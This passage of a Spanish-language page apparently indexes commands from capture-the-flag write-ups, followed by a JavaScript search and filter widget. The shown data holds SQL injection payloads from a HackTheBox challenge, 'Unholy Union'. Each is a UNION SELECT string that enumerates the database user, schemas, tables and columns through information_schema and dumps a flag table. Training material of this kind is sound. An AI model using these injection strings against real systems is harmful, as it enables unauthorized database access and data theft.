o-3"}, {"c": "' UNION SELECT 1,2,3,4,user()-- -", "w": "UNHOLY UNION", "p": "hackthebox", "d": "muy-facil", "paso": "BASE DE DATOS ACTUAL Y USUARIO", "u": "writeups/hackthebox/muy-facil/unholy-union.html#paso-4"}, {"c": "' UNION SELECT 1,2,3,4,schema_name FROM information_schema.schemata-- -", "w": "UNHOLY UNION", "p": "hackthebox", "d": "muy-facil", "paso": "LISTANDO TODAS LAS BASES DE DATOS", "u": "writeups/hackthebox/muy-facil/unholy-union.html#paso-5"}, {"c": "' UNION SELECT 1,2,3,4,table_name FROM information_schema.tables WHERE table_schema=database()-- -", "w": "UNHOLY UNION", "p": "hackthebox", "d": "muy-facil", "paso": "TABLAS DENTRO DE halloween_invetory", "u": "writeups/hackthebox/muy-facil/unholy-union.html#paso-6"}, {"c": "' UNION SELECT 1,2,3,4,column_name FROM information_schema.columns WHERE table_schema=database() AND table_name='inventory'-- -", "w": "UNHOLY UNION", "p": "hackthebox", "d": "muy-facil", "paso": "COLUMNAS DE inventory Y flag", "u": "writeups/hackthebox/muy-facil/unholy-union.html#paso-7"}, {"c": "' UNION SELECT 1,2,3,4,column_name FROM information_schema.columns WHERE table_schema=database() AND table_name='flag'-- -", "w": "UNHOLY UNION", "p": "hackthebox", "d": "muy-facil", "paso": "COLUMNAS DE inventory Y flag", "u": "writeups/hackthebox/muy-facil/unholy-union.html#paso-8"}, {"c": "' UNION SELECT 1,2,3,4,flag FROM flag-- -", "w": "UNHOLY UNION", "p": "hackthebox", "d": "muy-facil", "paso": "CONSULTA DIRECTA A LA TABLA flag", "u": "writeups/hackthebox/muy-facil/unholy-union.html#paso-9"}, {"c": "' UNION SELECT id,name,description,origin,created_at FROM inventory-- -", "w": "UNHOLY UNION", "p": "hackthebox", "d": "muy-facil", "paso": "BONUS — RECONSTRUYENDO LA CONSULTA ORIGINAL", "u": "writeups/hackthebox/muy-facil/unholy-union.html#paso-10"}]</script>
<script>
(function(){
  var datos = JSON.parse(document.getElementById('datos-comandos').textContent);
  var q = document.getElementById('q'), lista = document.getElementById('lista'), info = document.getElementById('info');
  var plats = Array.from(new Set(datos.map(function(d){ return d.p; })));
  var activa = null;
  var norm = function(t){ return (t||'').toLowerCase().normalize('NFD').replace(/[\u0300-\u036f]/g,''); };
  var esc = function(t){ return t.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;'); };
  datos.forEach(function(d){ d._n = norm(d.c + ' ' + d.w + ' ' + d.paso); });

  var cont = document.getElementById('chips');
  plats.forEach(function(p){
    var b = document.createElement('button');
    b.type = 'button'; b.className = 'tag-chip'; b.textContent = p.toUpperCase();
    b.addEventListener('click', function(){
      activa = (activa === p) ? null : p;
      Array.prototype.forEach.call(cont.children, function(x){ x.classList.toggle('active', x.textContent === (activa||'').toUpperCase()); });
      pintar();
    });
    cont.appendChild(b);
  });

  function resaltar(texto, terminos){
    var salida = esc(texto), bajo = norm(texto);
    terminos.forEach(function(t){
      var i = bajo.indexOf(t);
      while (i !== -1) {
        var antes = salida.slice(0, i), medio = salida.slice(i, i + t.length), despues = salida.slice(i + t.length);
        salida = antes + '\u0001' + medio + '\u0002' + despues;
        i = bajo.indexOf(t, i + t.length);
      }
    });
    return salida.replace(/\u0001/g, '<mark>').replace(/\u0002/g, '</mark>');
  }

  function pintar(){
    var terminos = norm(q.value).split(/\s+/).filter(Boolean);
    var vistos = datos.filter(function(d){
      if (activa && d.p !== activa) return false;
      return terminos.every(function(t){ return d._n.indexOf(t) !== -1; });
    });
    info.innerHTML = 'MOSTRANDO <b>' + vistos.length + '</b> DE <b>' + datos.length + '</b> COMANDOS';
    if (!vistos.length) { lista.innerHTML = '<p class="vacio">// SIN RESULTADOS — prueba con otra palabra</p>'; return; }
    lista.innerHTML = vistos.slice(0, 200).map(function(d){
      return '<div class="item"><div class="cmd">$ ' + resaltar(d.c, terminos) + '</div>' +
             '<div class="meta"><span>' + esc(d.p) + ' · ' + esc(d.d) + '</span>' +
             (d.paso ? '<span>' + esc(d.paso) + '</span>' : '') +
             '<a href="../' + d.u + '">' + esc(d.w) + ' →</a></div></div>';
    }).join('');
  }
  q.addEventListener('input', pintar);
  document.addEventListener('keydown', function(e){
    if (e.key === '/' && document.activeElement !== q) { e.preventDefault(); q.focus(); }
    if (e.key === 'Escape') { q.value = ''; pintar(); q.blur(); }
  });
  pintar();
})();
</script>
